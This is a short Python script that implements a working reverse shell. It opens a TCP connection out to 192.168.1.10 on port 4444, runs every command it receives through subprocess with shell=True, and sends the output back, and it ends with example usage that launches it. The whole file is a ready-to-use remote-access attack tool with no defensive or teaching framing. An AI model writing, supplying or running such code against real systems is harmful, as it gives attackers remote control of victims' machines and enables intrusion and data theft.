import socket
import subprocess

def reverse_shell(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    
    while True:
        command = sock.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout)
    
    sock.close()

# Example usage
ip = "192.168.1.10"
port = 4444
reverse_shell(ip, port)